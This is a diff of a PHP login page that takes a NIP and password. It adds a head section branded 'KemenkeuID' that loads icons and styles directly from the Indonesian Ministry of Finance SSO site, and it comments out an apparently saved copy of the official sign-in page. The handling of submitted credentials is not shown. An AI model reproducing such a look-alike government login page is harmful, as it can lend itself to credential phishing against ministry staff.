@@ -1,6 +1,6 @@
 <?php
 
-if(isset($_POST['login'])){
+if(isset($_POST['submit_login'])){
     if($_POST['nip'] == '' OR $_POST['password'] == ''){
         echo "masih ada yang kosong";
     }else{
@@ -19,9 +19,59 @@ if(isset($_POST['login'])){
 
 ?>
 
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+    <title>KemenkeuID</title>
+    <link rel="icon" type="image/x-icon" href="https://sso.kemenkeu.go.id//v2-assets/assets/imgs/favicon.ico" />
+    <link rel="shortcut icon" type="image/x-icon" href="https://sso.kemenkeu.go.id//v2-assets/assets/imgs/favicon.ico" />
+    <link rel="stylesheet" href="https://sso.kemenkeu.go.id//v2-assets/lib/bootstrap/css/bootstrap.min.css" />
+    <link rel="stylesheet" type="text/css" href="https://sso.kemenkeu.go.id//v2-assets/assets/fonts/font-awesome-4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="https://sso.kemenkeu.go.id//v2-assets/css/site.css" />
+    <link rel="stylesheet" type="text/css" href="https://sso.kemenkeu.go.id//v2-assets/css/customMain.css">
+    <link rel="stylesheet" type="text/css" href="https://sso.kemenkeu.go.id//v2-assets/assets/vendors/jqueryui/jquery-ui.css">
+</head>
 
 
+<section class="content">
 
+<div class="container-fluid">
+
+<div class="row">
+<div class="col-md-6">
+
+<form method="POST" action="">
+    <div class="card-body">
+
+    <h1>Login</h1>
+
+      <div class="form-group">
+        <label for="exampleInputEmail1">NIP</label>
+        <input type="text" class="form-control" name="nip"  placeholder="NIP" value="" >
+      </div>
+
+      <div class="form-group">
+        <label for="exampleInputEmail1">Password</label>
+        <input type="password" class="form-control" name="password"  placeholder="Nama" value="">
+      </div>
+
+      <div class="card-footer">
+        <button type="submit" name="submit_login" values="SIMPAN" class="btn btn-primary">LOGIN</button>
+    </div>
+
+    </div>
+  </form>
+
+
+  </div>
+  </div>
+  </div>
+  </div>
+      
+
+
+<!-- 
 <!DOCTYPE html>
 <html>
 <head>
@@ -92,7 +142,7 @@ if(isset($_POST['login'])){
                 </div>
 
                 <!-- <div class="g-recaptcha" data-sitekey="6LcXwJYUAAAAAAJS7MOIfoqPeFP-OuckuPJlBoB8"></div>  -->
-                <div class="flex-sb-m w-full p-t-3 p-b-32">
+                <!-- <div class="flex-sb-m w-full p-t-3 p-b-32">
                     <div class="form-group">
                         <center>
                             <a href="https://sso.kemenkeu.go.id//NewAccount/ForgotPassword?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Dnew-nadine-satu%26redirect_uri%3Dhttps%253A%252F%252Fsatu.kemenkeu.go.id%26response_type%3Dcode%26scope%3Dopenid%2520profile%2520frontend.nadine%2520organisasi.hris%2520profil.hris%2520jabatan.hris%2520pegawai.ekemenkeu%2520agenda.ekemenkeu%2520agenda.ekemenkeu%2520notification.ekemenkeu%2520kehumasan%26nonce%3D083f07bf4232fa9287727840e291545262feYe2Yg%26state%3Dd4266d4e197fc0c90e8295bdc76704f093QI0QCNA%26code_challenge%3D5JTdjNzy4A-oAuk60KliaK31UwPXNmz4kEiK1Ni2rDQ%26code_challenge_method%3DS256" class="txt3">
@@ -154,4 +204,4 @@ if(isset($_POST['login'])){
 
     </div>
 </body>
-</html>
+</html> --> 
